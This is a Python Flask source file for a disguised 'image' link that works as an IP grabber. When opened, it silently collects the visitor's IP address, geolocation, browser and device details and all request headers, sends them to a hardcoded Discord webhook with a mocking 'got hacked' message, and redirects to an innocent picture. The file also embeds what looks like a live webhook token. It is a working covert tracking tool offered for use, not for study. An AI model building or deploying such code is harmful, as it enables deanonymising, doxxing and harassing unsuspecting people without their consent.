from flask import Flask, request, redirect
import requests
from user_agent import UserAgent
from datetime import datetime
import json

app = Flask(__name__)

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1400223581509521559/XEtC2l1RzCHOFxbUmcITB8N_UXUwr-cNl2s0B62JdsSe715H0MqFmZGndsByCcGLd2in"

# Helper function to get geolocation from IP
def get_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        return response.json()
    except Exception as e:
        return {"error": f"Geolocation lookup failed: {str(e)}"}

# Endpoint to serve the "image" and collect data
@app.route('/image')
def image():
    # Collect data
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    user_agent = UserAgent(user_agent_str)
    device_info = {
        "browser": user_agent.browser,
        "browser_version": user_agent.version,
        "os": user_agent.os,
        "os_version": user_agent.os_version,
        "device": user_agent.device,
        "is_mobile": user_agent.is_mobile,
        "is_tablet": user_agent.is_tablet,
        "is_pc": user_agent.is_pc
    }
    geolocation = get_geolocation(ip)
    timestamp = datetime.utcnow().isoformat()
    headers = dict(request.headers)

    # Compile collected data
    data = {
        "ip": ip,
        "device_info": device_info,
        "geolocation": geolocation,
        "headers": headers,
        "timestamp": timestamp
    }

    # Send data to Discord webhook
    try:
        payload = {
            "username": "MrRobot",
            "content": "New dumbass got hacked",
            "embeds": [
                {
                    "title": "User Information",
                    "color": 0xff0000,
                    "fields": [
                        {"name": "IP Address", "value": ip or "Unknown", "inline": True},
                        {"name": "Browser", "value": device_info["browser"] or "Unknown", "inline": True},
                        {"name": "OS", "value": device_info["os"] or "Unknown", "inline": True},
                        {"name": "Device", "value": device_info["device"] or "Unknown", "inline": True},
                        {"name": "Is Mobile", "value": "Yes" if device_info["is_mobile"] else "No", "inline": True},
                        {"name": "Timestamp", "value": timestamp, "inline": False},
                        {"name": "Geolocation", "value": json.dumps(geolocation, indent=2), "inline": False},
                        {"name": "Headers", "value": json.dumps(headers, indent=2), "inline": False}
                    ]
                }
            ]
        }
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Webhook error: {str(e)}")

    # Redirect to a placeholder image
    return redirect("https://i.pinimg.com/736x/69/dd/1c/69dd1c598dc6a7ce4513793f886d0341.jpg")  # Replace with actual image URL if desired

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
